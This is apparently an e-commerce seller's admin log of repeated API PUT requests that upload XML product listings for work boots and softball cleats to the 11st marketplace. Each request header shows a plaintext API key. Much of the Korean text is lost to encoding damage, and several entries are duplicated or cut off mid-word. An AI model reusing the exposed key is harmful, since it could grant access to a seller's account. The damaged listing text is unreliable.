+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Carhartt Mens Bison 8 Waterproof Work Boots</div><div style="text-align:left;">PROD950003329</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>For ultimate workplace wear, step in.to the high-cut, high-performance Carhartt&reg; Men..s Bison 8'''' Waterproof work boot. The oil-tanned leather upper provides superior protection against on-the-job abrasions, while a waterproof interior membrane shields feet against the elements. A TPU stabilizer ensures a secure step, and the outsole maximizes traction on treacherously wet surfaces. For reliable workplace performance, lace up the Bison boot. FEATURES:<br>Oil-tanned leather upper delivers unmatched durability on tough jobs <br>Waterproof interior membrane protects feet against incoming moisture for lasting dryness <br>PU Strobel pad with PU cushion insole provides superior cushioning for lasting comfort <br>TPU stabilizer provides ultimate heel support for a secure step <br>Direct attached welt construction increases durability <br>Achillex flex join allows for a wide range of performance-based motion <br>Outsole maximizes traction on oil, chemicals, and other slippery surfaces <br>Meets ASTM 2892-11 EH standards for workplace wear <br>Height: 8'''' <br> Click here for additional information relating to the Manufacturer..s Warranty.Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Carhartt<br>Country of Origin: Imported<br>Style: CMW8100 <br>Web 
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2010789128 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 11504
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020747]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[Muck Boots Muck Boot Mens Muckmaster High Waterproof Work Boots/950006967 .... ..../....]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Muck Boots]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950006967]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006967/600_600_15MBOMMCKMSTRHBLCFBO_Black.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006967/600_600_15MBOMMCKMSTRHBLCFBO_Black.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006967/600_600_15MBOMMCKMSTRHBLCFBO_Black.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006967/600_600_15MBOMMCKMSTRHBLCFBO_Black.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Muck Boot Mens Muckmaster High Waterproof Work Boots</div><div style="text-align:left;">PROD950006967</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Get the job done in comfort with The Original Muck Boot Company&reg; Men..s Muckmaster&trade; High Waterproof work boot. Featuring a high rubber overlay and topline binding, this waterproof boot protects you from the elements, while keeping you comfortable with an included Achilles reinforcement and wrap-up bumper protection around the toes. A molded rubber outsole delivers the traction you need to stay protected while on the jobsite. FEATURES:<br>Stretch-fit topline binding hugs the calf to keep warmth in and cold out <br>High rubber overlay for protection against the harsh elements <br>5mm CR flex-foam bootie with four-way stretch nylon for flexible comfort <br>Snag-resistant, 100 percent waterproof is lightweight and flexible to fit any size calf <br>Achilles reinforcement for additional protection <br>10mm kick rim for hands-free removal <br>Added toe protection with a wrap-up bumper protects you from potential injury <br>EVA molded midsole with contoured footbed for excellent arch support <br>2mm thermal foam underlay at the instep area for added support and warmth <br>Molded rubber outsole provides long lasting quality and durability<br>Calf circumference: 17''''<br>Weight: 4.48 lbs<br>Last: MBC-01M-1<br>Comfort range: 85&def;F to sub-freezing conditions <br>Manufacturer..s warranty: one year from date of purchase against manufacturer..s defect Proposition 65 wap?}??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2010789128 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 11504
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020747]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[Muck Boots Muck Boot Mens Muckmaster High Waterproof Work Boots/950006967 .... ..../....]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Muck Boots]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950006967]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006967/600_600_15MBOMMCKMSTRHBLCFBO_Black.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006967/600_600_15MBOMMCKMSTRHBLCFBO_Black.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006967/600_600_15MBOMMCKMSTRHBLCFBO_Black.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006967/600_600_15MBOMMCKMSTRHBLCFBO_Black.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Muck Boot Mens Muckmaster High Waterproof Work Boots</div><div style="text-align:left;">PROD950006967</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Get the job done in comfort with The Original Muck Boot Company&reg; Men..s Muckmaster&trade; High Waterproof work boot. Featuring a high rubber overlay and topline binding, this waterproof boot protects you from the elements, while keeping you comfortable with an included Achilles reinforcement and wrap-up bumper protection around the toes. A molded rubber outsole delivers the traction you need to stay protected while on the jobsite. FEATURES:<br>Stretch-fit topline binding hugs the calf to keep warmth in and cold out <br>High rubber overlay for protection against the harsh elements <br>5mm CR flex-foam bootie with four-way stretch nylon for flexible comfort <br>Snag-resistant, 100 percent waterproof is lightweight and flexible to fit any size calf <br>Achilles reinforcement for additional protection <br>10mm kick rim for hands-free removal <br>Added toe protection with a wrap-up bumper protects you from potential injury <br>EVA molded midsole with contoured footbed for excellent arch support <br>2mm thermal foam underlay at the instep area for added support and warmth <br>Molded rubber outsole provides long lasting quality and durability<br>Calf circumference: 17''''<br>Weight: 4.48 lbs<br>Last: MBC-01M-1<br>Comfort range: 85&def;F to sub-freezing conditions <br>Manufacturer..s warranty: one year from date of purchase against manufacturer..s defect Proposition 65 wa
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2010792022 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 31236
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123487]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[...... Mizuno  Womens 9-Spike Advanced Sweep 3 Fastpitch Cleat/950006810 .... ....../......]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Mizuno ]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950006810]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Mizuno/950006810/600_600_16MIZM9SPKDVNCDSWSTL_White_Royal.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Mizuno/950006810/600_600_16MIZM9SPKDVNCDSWSTL_White_Royal.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Mizuno/950006810/600_600_16MIZM9SPKDVNCDSWSTL_White_Royal.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Mizuno/950006810/600_600_16MIZM9SPKDVNCDSWSTL_White_Royal.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Mizuno Womens 9-Spike Advanced Sweep 3 Fastpitch Cleat</div><div style="text-align:left;">PROD950006810</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Perform at a level previously reserved for the pros in the 9-Spike&trade; Sweep III. A Synthetic Leather upper offers ideal comfort, padding and stability while a full-length midsole and parallel outsole wave provide stability shock absorption and comfort. The Mizuno&reg; 9-Spike&trade; Advanced Sweep 3 fastpitch cleat has a metal 9-Spike&trade; advanced FP cleat configuration that ensures superior traction and performance on the field.FEATURES:<br>Gender engineered and built on a last specifically designed for superior feel during women''s Fastpitch softball <br>Synthetic Leather upper with built in ''toe-protector and padded tongue ensures ideal breathability, protection and a comfortable fit<br>Full-length midsole and parallel outsole wave offer added cushioning, stability and shock absorption for lasting comfort<br>Metal 9-Spik&trade; Advanced Fast Pitch configuration Outsole designed to deliver superior traction <br>Strategically positioned spikes enhance running, batting and throwing movements <br>Weight: 10.1 oz Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Mizuno<br>Country of Origin: Imported<br>Style: 320546 <br>Web ID: 16MIZM9SPKDVNCDSWSTL function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var dep?}??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2010792022 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 31236
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123487]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[...... Mizuno  Womens 9-Spike Advanced Sweep 3 Fastpitch Cleat/950006810 .... ....../......]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Mizuno ]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950006810]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Mizuno/950006810/600_600_16MIZM9SPKDVNCDSWSTL_White_Royal.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Mizuno/950006810/600_600_16MIZM9SPKDVNCDSWSTL_White_Royal.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Mizuno/950006810/600_600_16MIZM9SPKDVNCDSWSTL_White_Royal.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Mizuno/950006810/600_600_16MIZM9SPKDVNCDSWSTL_White_Royal.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Mizuno Womens 9-Spike Advanced Sweep 3 Fastpitch Cleat</div><div style="text-align:left;">PROD950006810</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Perform at a level previously reserved for the pros in the 9-Spike&trade; Sweep III. A Synthetic Leather upper offers ideal comfort, padding and stability while a full-length midsole and parallel outsole wave provide stability shock absorption and comfort. The Mizuno&reg; 9-Spike&trade; Advanced Sweep 3 fastpitch cleat has a metal 9-Spike&trade; advanced FP cleat configuration that ensures superior traction and performance on the field.FEATURES:<br>Gender engineered and built on a last specifically designed for superior feel during women''s Fastpitch softball <br>Synthetic Leather upper with built in ''toe-protector and padded tongue ensures ideal breathability, protection and a comfortable fit<br>Full-length midsole and parallel outsole wave offer added cushioning, stability and shock absorption for lasting comfort<br>Metal 9-Spik&trade; Advanced Fast Pitch configuration Outsole designed to deliver superior traction <br>Strategically positioned spikes enhance running, batting and throwing movements <br>Weight: 10.1 oz Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Mizuno<br>Country of Origin: Imported<br>Style: 320546 <br>Web ID: 16MIZM9SPKDVNCDSWSTL function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var de
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2010788709 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 11994
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020747]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[Muck Boots  Mens Arctic Sport Steel Toe Waterproof Work Boots/950006977 .... ..../....]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Muck Boots]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950006977]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006977/600_600_15MBOMRCTCSPRTSTBFBO_Black.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006977/600_600_15MBOMRCTCSPRTSTBFBO_Black.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006977/600_600_15MBOMRCTCSPRTSTBFBO_Black.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006977/600_600_15MBOMRCTCSPRTSTBFBO_Black.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Muck Boots Mens Arctic Sport Steel Toe Waterproof Work Boots</div><div style="text-align:left;">PROD950006977</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Get the durable comfort you need to get the job done with The Original Muck Boot Company&reg; Men..s Artic Sport Steel Toe Waterproof work boot. This waterproof boot features a flex-foam bootie for durable flexibility with a topline binding that molds to your leg to keep the cold and excess water out. An EVA molded midsole offers supreme stability, while a MS-1 molded outsole provides the traction you need, so you stay worry-free on the jobsite. FEATURES:<br>Stretch-fit topline binding is flush against the leg to keep warmth in and harsh, cold weather out <br>5mm CR flex-foam bootie with four-way stretch nylon delivers ultimate freedom of movement <br>100 percent waterproof that..s lightweight and flexible as you get the job done <br>Double reinforcements underlay added to the instep area for additional warmth and comfort <br>EVA molded midsole with contoured footbed for excellent arch support<br>MS-1 molded outsole delivers traction while providing maximum protection and stability <br>Comfort range: -40&deg;F to 60&deg;F <br>Steel toe meets ASTM F2413-05 for safe workplace standards <br>Manufacturer..s warranty: one year from date of purchase against manufacturer..s defect Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Muck Boots<br>Country of Origin: Imported<br>Style: ASP <br>Web ID:p?}??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2010788709 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 11994
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020747]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[Muck Boots  Mens Arctic Sport Steel Toe Waterproof Work Boots/950006977 .... ..../....]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Muck Boots]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950006977]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006977/600_600_15MBOMRCTCSPRTSTBFBO_Black.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006977/600_600_15MBOMRCTCSPRTSTBFBO_Black.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006977/600_600_15MBOMRCTCSPRTSTBFBO_Black.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006977/600_600_15MBOMRCTCSPRTSTBFBO_Black.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Muck Boots Mens Arctic Sport Steel Toe Waterproof Work Boots</div><div style="text-align:left;">PROD950006977</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Get the durable comfort you need to get the job done with The Original Muck Boot Company&reg; Men..s Artic Sport Steel Toe Waterproof work boot. This waterproof boot features a flex-foam bootie for durable flexibility with a topline binding that molds to your leg to keep the cold and excess water out. An EVA molded midsole offers supreme stability, while a MS-1 molded outsole provides the traction you need, so you stay worry-free on the jobsite. FEATURES:<br>Stretch-fit topline binding is flush against the leg to keep warmth in and harsh, cold weather out <br>5mm CR flex-foam bootie with four-way stretch nylon delivers ultimate freedom of movement <br>100 percent waterproof that..s lightweight and flexible as you get the job done <br>Double reinforcements underlay added to the instep area for additional warmth and comfort <br>EVA molded midsole with contoured footbed for excellent arch support<br>MS-1 molded outsole delivers traction while providing maximum protection and stability <br>Comfort range: -40&deg;F to 60&deg;F <br>Steel toe meets ASTM F2413-05 for safe workplace standards <br>Manufacturer..s warranty: one year from date of purchase against manufacturer..s defect Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Muck Boots<br>Country of Origin: Imported<br>Style: ASP <br>Web ID:
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2010789524 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 13477
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020747]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[Muck Boots  Mens Chore High Waterproof Work Boots/950006959 .... ..../....]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Muck Boots]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950006959]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006959/600_600_15MBOMMNCHRHBLCKXFBO_Black_AGR.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006959/600_600_15MBOMMNCHRHBLCKXFBO_Black_AGR.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006959/600_600_15MBOMMNCHRHBLCKXFBO_Black_AGR.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/MuckBoots/950006959/600_600_15MBOMMNCHRHBLCKXFBO_Black_AGR.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Muck Boots Mens Chore High Waterproof Work Boots</div><div style="text-align:left;">PROD950006959</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>No job is too tough for Muck Boots&reg; Men..s Chore High boots. Built with reliable waterproof protection, exceptional durability and no-slip grip, these do-anything rubber boots empower you to tackle any job.WEATHER-READY PERFORMANCE:100 waterproof construction<br>Comfort range: 85&deg;F to sub-freezing conditionsDESIGN:<br>Stretch-fit topline binding hugs accommodates most calf girths<br>5mm CR flex-foam bootie with four-way stretch nylon offers freedom of movement<br>Airmesh&trade; lining stays breathable and comfortable<br>Achilles reinforcement for additional protection and stability<br>Kick rim on heels for easy removal<br>Wide cut heel base for excellent stabilityDURABLE WEAR:<br>Seamless, quick-clean rubber overlay for easy maintenance 